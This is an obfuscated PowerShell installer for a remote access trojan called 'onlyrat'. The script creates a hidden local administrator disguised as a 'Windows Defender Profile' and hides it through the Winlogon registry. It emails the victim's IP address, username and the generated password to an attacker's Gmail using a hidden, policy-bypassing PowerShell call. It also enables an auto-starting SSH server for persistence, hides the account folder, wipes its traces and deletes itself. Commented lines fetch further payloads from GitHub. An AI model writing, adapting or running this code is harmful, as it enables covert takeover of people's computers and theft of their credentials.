function mfRCoqywZDeQlL($mNHDTfYFzXUeZn){
    return -join ((65..90) + (97..122)|Get-Random -Count $mNHDTfYFzXUeZn|%{[char]$_})
}

# Create local admin for the rat
function hqTnJbKVSsMrZgXw {
    [CmdletBinding()]
    param (
        [string] $vWrPkQSpYZtOb,
        [securestring] $WSUcYXCfOldphPx
    )    
    begin {
    }    
    process {
        New-LocalUser "$vWrPkQSpYZtOb" -Password $WSUcYXCfOldphPx -FullName "$vWrPkQSpYZtOb" -Description "Windows Defender Profile" # can remove description parameter if want
        # Write-Verbose "$vWrPkQSpYZtOb local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$vWrPkQSpYZtOb"
        # Write-Verbose "$vWrPkQSpYZtOb added to the local administrator group"
    }    
    end {
    }
}
# create admin user
$NzSqmkZnFQcBf = "onlyrat"
$OIRXhsDHFU = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 19)
Remove-LocalUser -Name "$NzSqmkZnFQcBf"
$blZqsekcOWhwU = (ConvertTo-SecureString $OIRXhsDHFU -AsPlainText -Force)
hqTnJbKVSsMrZgXw -vWrPkQSpYZtOb $NzSqmkZnFQcBf -WSUcYXCfOldphPx $blZqsekcOWhwU
# registry
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name SpecialAccounts -Force
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $NzSqmkZnFQcBf -Value 0 -Type DWORD -Force

# Variables
# $EubGKxeoVHdWnNIr = mfRCoqywZDeQlL(5)
# $rkeuRmdqpyEPQG = "$env:TEMP\$EubGKxeoVHdWnNIr"
# save current directory
$fXmtFxsAMdGw = Get-Location|%{$_.Path}

$QLxOhYDbSkv = Get-Content .\KHPWMpTitfZ.txt
$MQKWAnzsGSxJ = Get-Content .\oSyEZsgTWIU.txt
$rtsRfiZBxpGP = "$env:username.rat"
$LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
#generate controller file
Add-Content -Path "$fXmtFxsAMdGw\meuqSoQyrCUvhGjpV.cmd" -Value "@echo off"
# generate config file
Add-Content -Path $rtsRfiZBxpGP -Value $LcghRQwiJbdINVyFY   #ip
Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
Add-Content -Path $rtsRfiZBxpGP -Value $env:USERNAME        #username
Add-Content -Path $rtsRfiZBxpGP -Value $env:temp            #temp dir
Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
# Send Initial reconnaissance
powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $QLxOhYDbSkv -to $QLxOhYDbSkv -subject $rtsRfiZBxpGP -attachments $rtsRfiZBxpGP -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $QLxOhYDbSkv ,(convertto-securestring -string '$MQKWAnzsGSxJ' -asplaintext -force))}"

# cleanup your credentials and reconnaissance files
Remove-Item .\KHPWMpTitfZ.txt -Force
Remove-Item .\oSyEZsgTWIU.txt -Force
Remove-Item .\$rtsRfiZBxpGP -Force


# goto temp and make working directory
# mkdir $rkeuRmdqpyEPQG
# cd $rkeuRmdqpyEPQG

# Download registry to hide local admin
# $reg_file = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 13)
# iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/admin.reg" -OutFile ".\$reg_file.reg"

# Download VbScript file which will automate our registry entry
# $vbs_file = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 13)
# iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/confirm.vbs" -OutFile ".\$vbs_file.vbs"

# enable persistent ssh
# Install the OpenSSH Client
# Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Install the OpenSSH Server feature
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the OpenSSH Server service
Start-Service sshd

# Set the service to start automatically on boot
Set-Service -Name sshd -StartupType Automatic

# Verify that the service is running
# Get-NetFirewallRule -Name *ssh*

# execute the registry entry process
# powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"

# move to users to hide our onlyrat local admin
cd C:\Users
attrib +h +s +r "onlyrat*"

# navigate to the saved directory and self delete
cd $fXmtFxsAMdGw
del OVlqumatcNr.ps1